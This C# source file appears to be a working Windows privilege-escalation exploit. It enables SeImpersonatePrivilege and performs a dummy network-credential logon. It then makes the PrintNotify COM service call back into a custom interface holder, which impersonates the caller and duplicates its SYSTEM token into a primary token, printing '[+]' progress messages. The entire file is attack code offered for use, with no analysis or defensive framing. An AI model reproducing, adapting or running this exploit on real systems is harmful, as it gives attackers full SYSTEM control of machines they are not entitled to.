using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Principal;
using Microsoft.Win32.SafeHandles;


namespace PrintNotif
{
    internal class ProcessWaitHandle : WaitHandle
    {
        internal ProcessWaitHandle(SafeWaitHandle processHandle)
        {
            base.SafeWaitHandle = processHandle;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr pSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public UInt32 Attributes;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    public enum TOKEN_TYPE
    {
        TokenPrimary = 1,
        TokenImpersonation
    }
    
    public enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    #region interop
    public static class NativeMethods
    {
        [DllImport("ole32.dll")]
        public static extern int CoInitializeSecurity(
            IntPtr pSecDesc,
            int cAuthSvc,
            IntPtr asAuthSvc,
            IntPtr pReserved1,
            int dwAuthnLevel,
            int dwImpLevel,
            IntPtr pAuthList,
            int dwCapabilities,
            IntPtr pReserved3);
        
        [DllImport("ole32.dll", ExactSpelling = true)]
        public static extern int CoCreateInstance(
            [In, MarshalAs(UnmanagedType.LPStruct)] Guid clsid,
            [MarshalAs(UnmanagedType.Interface)] object punkOuter,
            int context,
            [In, MarshalAs(UnmanagedType.LPStruct)] Guid iid,
            [MarshalAs(UnmanagedType.Interface)] out object punk);
        
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr token);
        
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool LogonUser(
            string username,
            string domain,
            string password,
            int dwLogonType,
            int dwLogonProvider,
            ref IntPtr phToken);
        
        [DllImport("ole32.dll")]
        public static extern int CoImpersonateClient();
        
        [DllImport("ole32.dll")]
        public static extern int CoRevertToSelf();
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
        public static extern bool CloseHandle(
            IntPtr handle);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(
            IntPtr TokenHandle,
            bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState,
            int Bufferlength,
            IntPtr PreviousState,
            IntPtr ReturnLength);
        
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(
            string lpSystemName,
            string lpName,
            out LUID lpLuid);
        
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpTokenAttributes,
            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
            TOKEN_TYPE TokenType,
            out IntPtr phNewToken);
    }
    #endregion

    class CustomQIHolder : ICustomQueryInterface
    {
		public IntPtr sysTkn = IntPtr.Zero;
		
        public CustomQueryInterfaceResult GetInterface(ref Guid iid, out IntPtr ppv)
        {
            NativeMethods.CoImpersonateClient();
            var identity = WindowsIdentity.GetCurrent();
            IntPtr tkn = identity.Token;

            var dwTokenRights = 395U;
            var securityAttr = new SECURITY_ATTRIBUTES();

            if (!NativeMethods.DuplicateTokenEx(tkn, 
                                dwTokenRights, 
                                ref securityAttr, 
                                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                TOKEN_TYPE.TokenPrimary, 
                                out sysTkn))
            {
                var errorCode = Marshal.GetLastWin32Error();
                NativeMethods.CloseHandle(tkn);
                throw new Exception("DuplicateTokenEx failed with the following error: " + errorCode);
            }

            ppv = IntPtr.Zero;
            return CustomQueryInterfaceResult.NotHandled;
        }
    }

    class Program
    {
        public static unsafe void Main(string[] args)
        {
            try
            {
                NativeMethods.CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, 0, 3, IntPtr.Zero, 0x40, IntPtr.Zero);
                LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
                using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
                {
                    Console.WriteLine("[+] Current user: '" + wi.Name + "'");
                    NativeMethods.LookupPrivilegeValue(null, "SeImpersonatePrivilege", out l[0].Luid);
                    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                    tp.PrivilegeCount = 1;
                    tp.Privileges = l;
                    l[0].Attributes = 2;
                    if (!NativeMethods.AdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
                    {
                        Console.WriteLine("[!] SeImpersonatePrivilege not held.");
                        return;
                    }
                }
                Console.WriteLine("[+] SeImpersonatePrivilege enabled");

                var CLSID_PrintNotifyService = new Guid("{854A20FB-2D44-457D-992F-EF13785D2B51}");
                IntPtr token = IntPtr.Zero;
                if (!NativeMethods.LogonUser("X", "X", "X", 9, 3, ref token) || !NativeMethods.ImpersonateLoggedOnUser(token))
                {
                    Console.WriteLine("[!] Logon as interactive error.");
                    return;
                }

                object obj = null;
                var hr = NativeMethods.CoCreateInstance(CLSID_PrintNotifyService, null, 4, new Guid("00000000-0000-0000-C000-000000000046"), out obj);
                if (hr != 0)
                {
                    Console.WriteLine("[!] CoCreateInstance fail with HRESULT: 0x" + hr.ToString("x"));
                    return;
                }
                var svc = obj as IConnectionPointContainer;
                IEnumConnectionPoints pEnumConnectionPoints;
                svc.EnumConnectionPoints(out pEnumConnectionPoints);
                int num = 1;
                hr = 0;
                int d = 0;
                IConnectionPoint[] arr = new IConnectionPoint[1];
                hr = pEnumConnectionPoints.Next(num, arr, (IntPtr)(&d));
                var holder = new CustomQIHolder();

                Console.WriteLine("[+] Impersonating...");
                do
                {
                    if (arr[0] != null)
                    {
                        try { arr[0].Advise(holder, out d); }
                        catch { }
                        break;
                    }
                    hr = pEnumConnectionPoints.Next(num, arr, (IntPtr)(&d));
                } while (hr == 0);
				
				Console.WriteLine("[+] Duplicated SYSTEM Token: '" + holder.sysTkn.ToInt32().ToString() + "'");

            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Exception: " + ex.ToString());
            }
        }
    }
}